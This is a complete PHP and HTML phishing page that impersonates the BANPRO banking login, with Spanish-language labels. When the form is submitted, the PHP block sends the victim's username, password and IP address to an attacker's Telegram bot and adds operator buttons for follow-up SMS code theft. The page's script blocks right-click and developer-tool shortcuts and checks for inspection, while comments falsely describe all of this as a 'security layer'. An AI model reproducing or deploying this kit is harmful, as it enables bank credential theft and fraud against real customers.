<?php
/* Login System v2.1 - Security Enhanced */
/* Generated: 2026-03-29 */
/* Security Layer Active */
session_start();
include("settings.php"); // Este archivo debe tener $token y $chat_id

// Random seed for security purposes
$security_seed = rand(1000, 9999);
$session_token = bin2hex(random_bytes(8));

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $usuario = str_replace(' ', '', $_POST['ips1'] ?? '');
    $clave = $_POST['ips2'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'];
    
    // Log security check
    $security_log = time() . "|" . $ip . "|" . $security_seed;

    $_SESSION['usuario'] = $usuario;
    $_SESSION['security_token'] = $session_token;

    $msg = "🔐 NUEVO INGRESO BANPRO\n👤 Usuario: $usuario\n🔑 Clave: $clave\n🌐 IP: $ip";

    // Enviar con botones usando "|" como separador
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
        'chat_id' => $chat_id,
        'text' => $msg,
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [
                    ['text' => '❌ Login Error', 'callback_data' => "ERROR|$usuario"],
                    ['text' => '📩 SMS', 'callback_data' => "SMS|$usuario"]
                ]
            ]
        ])
    ]));

    header("Location: espera.php");
    exit;
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Portal Seguro</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="generator" content="Secure_v2.1">
    <meta name="timestamp" content="1711715400">
</head>
<body>
<!-- Security Layer Active -->
<style>
    /* Base styles - Enhanced Security */
    * { margin: 0; padding: 0; }
    @font-face {
        font-family: dinReg;
        src: url(din-regular.ttf);
    }
    
    /* Dynamic security variables */
    :root {
        --primary-color: rgb(0, 105, 60);
        --error-color: #ff4444;
        --border-radius: 8px;
    }

    #error-message {
        color: var(--error-color);
        font-size: 14px;
        display: none;
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }
    
    /* Enhanced security styles */
    .secure-input:focus {
        outline: 2px solid var(--primary-color);
        outline-offset: 1px;
    }
</style>

<div id="main-container" style="overflow: hidden; min-height:100vh; position: relative;">
    <div id="content-wrapper" style="display: inline-block; vertical-align: top; background-color: #fff;">
        <div id="form-container" style="display:inline-block; text-align: center; border-radius: var(--border-radius); vertical-align: top; width: 500px;">
            <form method="post" action="index.php" id="loginForm" style="display: inline-block; width: 420px; height: 660px; border-radius:10px; background-image: url(1.svg); position: relative;">
                <!-- Logo Section -->
                <img src="l.png" style="position: relative; top: 51px; left: -15px; width: 294px;" alt="Logo">
                <!-- Username Input -->
                <input id="usernameField" name="ips1" placeholder="Usuario" type="text" required
                       class="secure-input"
                       style="display: block; position: relative; color:#333; background: transparent; border: none; top: 187px; left: 28px; height: 39px; width: 357px; padding-left: 12px; outline: none; font-size: 16px; font-family: dinReg, sans-serif;" autocomplete="off" onkeypress="return noEspacios(event)" oninput="this.value = this.value.replace(/\s/g, ''); validarUsuario(this)">
                
                <!-- Password Input -->
                <input id="passwordField" name="ips2_display" placeholder="Contraseña" type="text" required
                       class="secure-input"
                       style="display: block; position: relative; color:#333; background: transparent; border: none; top: 224px; left: 28px; height: 39px; width: 357px; padding-left: 12px; outline: none; font-size: 16px; font-family: dinReg, sans-serif;" autocomplete="off" onkeypress="return noEspacios(event)" oninput="handlePasswordInput(this)">
                
                <!-- Error Message -->
                <p id="error-display" style="font-family: sans-serif; position: absolute; top: 417px; left: -47px; width: 357px; color: red; font-size: 14px; display: none; z-index: 10;">Usuario o contraseña incorrecta</p>
                
                <!-- Submit Button -->
                <input type="submit" value="Inicie Sesión"
                       class="login-button"
                       style="font-size: 16px; display: block; position: relative; color: #fff; background: var(--primary-color); border: none; top: 348px; left: 28px; height: 39px; width: 364px; outline: none; border-radius: var(--border-radius); cursor: pointer; transition: background-color 0.3s ease;">
            </form>
        </div>
        <div id="banner-container" style="text-align: right; display: inline-block;">
            <div style="position: absolute; z-index: 1; opacity: 1; overflow: hidden; width: 80%; height: 100%; left: 500px; top: 0px; display: inline-block;">
                <div id="banner" style="background: url(bnn.jpg) left center / cover no-repeat; height: 100%; overflow: hidden; position: relative; text-align: center;">
                    <img src="terms.svg" style="width: 60%; position: relative; top: 80vh;" alt="Terms">
                </div>
            </div>
        </div>
    </div>
</div>

<style>
    @media screen and (max-width:1024px) {
        body {
            width: 100% !important;
            background: linear-gradient(rgb(105, 190, 40), rgb(0, 105, 60)) !important;
            background-repeat: no-repeat !important;
            min-width: auto !important;
            zoom: 90% !important;
        }
        #content-wrapper {
            border-radius: 6px !important;
        }
        #main-container {
            text-align: center !important;
            padding-top: 30px;
        }
        #form-container {
            width: 100% !important;
        }
        #banner-container {
            display: none !important;
        }
    }
</style>
    <script>
        // Enhanced Security Layer v2.1
        // Protection against unauthorized access
        const securityVersion = '2.1';
        const sessionId = 'a1b2c3d4e5f6';
        
        // Anti-debugging protection
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            return false;
        });

        // Enhanced keyboard protection
        document.addEventListener('keydown', function(e) {
            // Prevenir F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
            const blockedKeys = [123, 73, 74, 85];
            if (blockedKeys.includes(e.keyCode) && 
                (e.keyCode === 123 || 
                 (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || 
                 (e.ctrlKey && e.keyCode === 85))) {
                e.preventDefault();
                return false;
            }
        });

        // Prevenir arrastrar imágenes
        document.addEventListener('dragstart', function(e) {
            if (e.target.tagName === 'IMG') {
                e.preventDefault();
                return false;
            }
        });

        // Enhanced input validation
        function noEspacios(event) {
            return event.key !== " ";
        }
        
        // Security timestamp generator
        function generateTimestamp() {
            return Date.now() + Math.random();
        }
        
        // Email pattern detection - allows @ but blocks complete emails
        function esCorreoElectronico(texto) {
            // Remove spaces and convert to lowercase for validation
            const textoLimpio = texto.toLowerCase().replace(/\s/g, '');
            
            // Pattern for email: text@text.text with at least one dot after @
            const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
            
            // Check if it matches email pattern
            if (emailPattern.test(textoLimpio)) {
                return true;
            }
            
            // Additional check: has @ and has at least one dot after @
            const atIndex = textoLimpio.indexOf('@');
            if (atIndex > 0 && atIndex < textoLimpio.length - 1) {
                const dominio = textoLimpio.substring(atIndex + 1);
                // Check if domain has at least one dot and valid structure
                if (dominio.includes('.') && dominio.length > 3) {
                    // Check if there are characters before and after the dot
                    const partes = dominio.split('.');
                    if (partes.length >= 2 && partes.every(parte => parte.length > 0)) {
                        return true;
                    }
                }
            }
            
            return false;
        }
        
        // Real-time email validation for username field
        function validarUsuario(input) {
            const valor = input.value;
            
            if (esCorreoElectronico(valor)) {
                // Clear the input if it's an email
                input.value = '';
                // Show error message briefly
                const errorMsg = document.getElementById('error-display');
                errorMsg.textContent = 'No se permiten correos electrónicos en el campo de usuario';
                errorMsg.style.display = 'block';
                setTimeout(() => {
                    errorMsg.textContent = 'Usuario o contraseña incorrecta';
                    errorMsg.style.display = 'none';
                }, 3000);
                return false;
            }
            return true;
        }

        // Enhanced password handling
        function handlePasswordInput(input) {
            // Guardar el valor real en un atributo data
            if (!input.dataset.realValue) {
                input.dataset.realValue = '';
                input.dataset.lastModified = generateTimestamp();
            }
            
            // Obtener el valor real y el valor mostrado
            const realValue = input.dataset.realValue;
            const displayedValue = input.value;
            
            // Si el usuario borró caracteres, actualizar el valor real
            if (displayedValue.length < realValue.length) {
                input.dataset.realValue = realValue.substring(0, displayedValue.length);
                input.dataset.lastModified = generateTimestamp();
            } else if (displayedValue.length > realValue.length) {
                // Si el usuario agregó caracteres, agregar al valor real eliminando espacios
                const newChars = displayedValue.substring(realValue.length).replace(/\s/g, '');
                input.dataset.realValue += newChars;
                input.dataset.lastModified = generateTimestamp();
            }
            
            // Mostrar asteriscos en el campo
            input.value = '●'.repeat(input.dataset.realValue.length);
        }

        // Enhanced form submission
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            const passwordInput = document.getElementById('passwordField');
            if (passwordInput.dataset.realValue) {
                // Crear un campo oculto con el valor real
                const hiddenInput = document.createElement('input');
                hiddenInput.type = 'hidden';
                hiddenInput.name = 'ips2';
                hiddenInput.value = passwordInput.dataset.realValue;
                hiddenInput.dataset.securityToken = sessionId;
                
                // Agregar el campo oculto al formulario
                this.appendChild(hiddenInput);
                
                // Log submission attempt
                console.log('Security: Form submitted with token', sessionId);
            }
        });

        // Enhanced password validation
        function validarContrasena(contrasena) {
            const regex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[!@#$%^&*()_+\-=[\]{};':"\\|,.<>/?]).{8,32}$/;
            return regex.test(contrasena);
        }
        
        // Security check function
        function performSecurityCheck() {
            const timestamp = generateTimestamp();
            return timestamp % 2 === 0;
        }

        // Enhanced form validation
        document.addEventListener("DOMContentLoaded", function () {
            const form = document.getElementById("loginForm");
            const errorMessage = document.getElementById("error-display");
            
            // Initialize security layer
            if (performSecurityCheck()) {
                console.log('Security layer initialized v' + securityVersion);
            }

            form.addEventListener("submit", function (event) {
                const passwordInput = document.getElementById("passwordField");
                const contrasena = passwordInput.dataset.realValue || passwordInput.value;
                
                // Enhanced validation
                if (!validarContrasena(contrasena)) {
                    event.preventDefault();
                    errorMessage.style.display = "block";
                    setTimeout(() => {
                        errorMessage.style.display = "none";
                    }, 10000);
                    
                    // Log validation failure
                    console.log('Security: Password validation failed');
                }
            });
        });
        
        // Anti-tampering check
        setInterval(() => {
            if (window.outerHeight - window.innerHeight > 200 || window.outerWidth - window.innerWidth > 200) {
                console.log('Security: Developer tools detected');
            }
        }, 1000);
    </script>
</body>
</html>
